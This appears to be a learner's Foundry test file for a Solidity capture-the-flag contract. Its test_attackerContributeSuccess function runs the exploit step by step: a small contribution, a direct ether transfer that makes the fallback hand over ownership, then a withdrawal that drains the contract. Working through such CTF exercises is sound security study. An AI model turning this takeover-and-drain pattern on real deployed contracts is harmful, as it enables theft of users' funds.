// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import "../src/fallbackctf1.sol";

contract FallbackTest is Test { 

    fallbackctf1 public ctf;
    address attacker = address(0x1338);
    address owner = address(0x1337);

// setup function is called before each test
function setUp() public {
    console.log("owner is: ", owner);
    // console.log("msg.sender is: ", msg.sender);
    vm.prank(owner); // prank is used to change the address of the sender in the test environment
    ctf = new fallbackctf1(); // create a new instance of the contract
    console.log("owner is: ", ctf.owner());
}

// a test function that first contribute than send direct transaction and then check if the owner is changedd
function test_OwnerCheck() public view {
    console.log("owner is: ", ctf.owner());
    assert(ctf.owner() == owner); // why this test fails? 
}

function test_attackerWithdrawFail() public {
    vm.prank(attacker);
    assertFalse(ctf.owner() == attacker);
}

function test_attackerContributeSuccess() public {
    vm.startPrank(attacker);
    //assertTrue(msg.sender == attacker);
    assertEq(address(ctf).balance, 0);
    vm.deal(attacker ,1 ether);
    ctf.contribute{value: 0.0001 ether}();
    assertFalse(ctf.owner() == attacker);
    assertEq(address(ctf).balance, 0.0001 ether);
    assertEq(ctf.getContribution(), 0.0001 ether);
    // 100000000000000 wei = 0.0001 ether

// use call on ctf using attacker address 

    address(ctf).call{value: 0.001 ether}("");
    assertTrue(ctf.owner() == attacker);
    assertEq(address(ctf).balance, 0.0011 ether);
    assertEq(ctf.getContribution(), 0.0001 ether);

    assertEq(address(ctf).balance, 0.0011 ether);
    ctf.withdraw();
    assertEq(address(ctf).balance, 0 ether);
    assertEq(attacker.balance, 1 ether);

}

}